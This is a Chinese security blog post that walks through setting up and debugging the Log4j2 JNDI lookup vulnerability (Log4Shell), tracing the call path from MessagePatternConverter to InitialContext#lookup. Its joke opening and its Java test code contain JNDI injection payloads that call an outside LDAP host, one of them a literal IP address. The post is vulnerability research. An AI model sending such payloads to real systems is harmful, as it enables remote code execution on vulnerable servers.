---
title: log4j2 jndi 漏洞学习和调试
author: ch4ser
typora-root-url: ../
date: 2021-12-11 14:56:51
categories:
  - 安全研究
---

> 明天安全圈校招面试:
> 面试官: 请说说你会什么技能?
> 我: ${jndi:ldap://xxx.dnslog.cn/exp}
> 面试官: 请说说你最近关注过的漏洞?
> 我: ${jndi:ldap://xxx.dnslog.cn/exp}
> 面试官: 你平时有动手调试过吗?
> 我: ${jndi:ldap://xxx.dnslog.cn/exp}
> 我：这dnslog是不是卡了 这面试官怎么还没rce

<!--more-->

## 环境搭建

新建maven项目, pom.xml写入

```xml
    <dependencies>
        <dependency>
            <groupId>org.apache.logging.log4j</groupId>
            <artifactId>log4j-api</artifactId>
            <version>2.14.1</version>
        </dependency>
    </dependencies>
```

1. 在官网 https://archive.apache.org/dist/logging/log4j/ 下载log4j然后在project structure中导入

![](2021-12-11-16-16-25.png)

2. 下载低版本java8 https://repo.huaweicloud.com/java/jdk/ 我下载的是8u181,将其作为java运行环境

![](2021-12-11-16-24-14.png)

写测试代码

```java
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Main {
    private static final Logger logger = LogManager.getLogger();
    public static void main(String[] args){
        logger.error("${jndi:ldap://39.105.176.37:1389/smzifq}");
    }
}
```

## 漏洞调试

调试进入

![image-20211211152434057](image-20211211152434057.png)

调试到
![image-20211211152611862](image-20211211152611862.png)

然后调试到`MessagePatternConverter#format`方法, 看到这里会试图匹配`${`字符.并将payload字符串解析到变量value中去.

![image-20211211152039629](image-20211211152039629.png)

步进replace函数, 再步进substitute函数
![image-20211211152218136](image-20211211152218136.png)

此处的StrSubstitutor类负责扫描目标字符串的中的patterns，并使用不同pattern所对应的StrLookup resolver解析，其中的对应关系如下，后文还会提及。

![lookupresolver](lookupresolver.png)

进入下一个substitute中会看到它会匹配结尾的`}`
![](2021-12-11-15-56-47.png)

再往下就可以看到`resolveVariable`方法被调用, 里面调用了`lookup`方法
![](2021-12-11-16-01-45.png)

![image-20211211152245317](image-20211211152245317.png)

在`lookup`方法中,会试图寻找`:`,并将`:`前面的部分作为prefix, 随后根据prefix来寻找类

![](2021-12-11-16-06-13.png)

可以看到这里规定了不同的prefix对应的类

![image-20211211150105597](image-20211211150105597.png)

使用的Jndi,所以使用的是`JndiLookup`类,调用了`JndiLookup#lookup`方法,并将`:`后面的部分作为参数传入.

![image-20211211150131696](image-20211211150131696.png)

最后调用到了`javax.naming.InitialContext#lookup`方法,server端收到请求
![](2021-12-11-16-11-46.png)

![](2021-12-11-16-13-38.png)

## 漏洞利用

普通的jndi注入就可以了

## 参考

https://www.anquanke.com/post/id/262668#h3-5
